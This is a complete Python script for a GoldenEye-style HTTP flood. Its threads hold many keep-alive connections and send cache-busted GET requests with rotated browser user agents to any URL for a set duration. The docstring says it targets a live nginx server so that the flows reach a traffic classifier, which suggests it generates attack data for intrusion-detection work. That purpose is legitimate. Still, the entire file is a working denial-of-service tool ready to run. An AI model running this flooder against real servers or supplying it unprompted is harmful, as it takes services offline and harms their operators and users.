#!/usr/bin/env python3
"""GoldenEye-style HTTP DoS flooder (compact, dependency-free).

Opens many concurrent keep-alive sockets and sends cache-busted GET requests in a
tight loop for a fixed duration. This is an application-layer flood against live
nginx, so each socket carries a multi-packet completed flow that reaches the
classifier (unlike a raw SYN flood, whose single-packet flows the sensor drops).

Usage: goldeneye.py --url http://HOST:80/ --duration 30 --workers 50
No em dashes anywhere.
"""
import argparse
import random
import socket
import string
import threading
import time
from urllib.parse import urlparse

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
]


def rand(n):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))


def worker(host, port, path, stop_at, counter, lock):
    sent = 0
    while time.time() < stop_at:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            # Reuse each socket for a burst of cache-busted GETs (keep-alive).
            for _ in range(random.randint(5, 15)):
                if time.time() >= stop_at:
                    break
                q = "%s?%s=%s" % (path, rand(6), rand(10))
                req = (
                    "GET %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Accept-Encoding: gzip, deflate\r\n"
                    "Cache-Control: no-cache\r\n"
                    "Connection: keep-alive\r\n\r\n"
                ) % (q, host, random.choice(UA))
                s.sendall(req.encode())
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                sent += 1
            s.close()
        except OSError:
            time.sleep(0.05)
    with lock:
        counter[0] += sent


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--duration", type=int, default=30)
    ap.add_argument("--workers", type=int, default=50)
    a = ap.parse_args()

    u = urlparse(a.url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"

    stop_at = time.time() + a.duration
    counter = [0]
    lock = threading.Lock()
    threads = [
        threading.Thread(target=worker, args=(host, port, path, stop_at, counter, lock))
        for _ in range(a.workers)
    ]
    print("goldeneye: %d workers -> %s:%d%s for %ds" % (a.workers, host, port, path, a.duration))
    for t in threads:
        t.daemon = True
        t.start()
    for t in threads:
        t.join()
    print("goldeneye: sent ~%d requests" % counter[0])


if __name__ == "__main__":
    main()
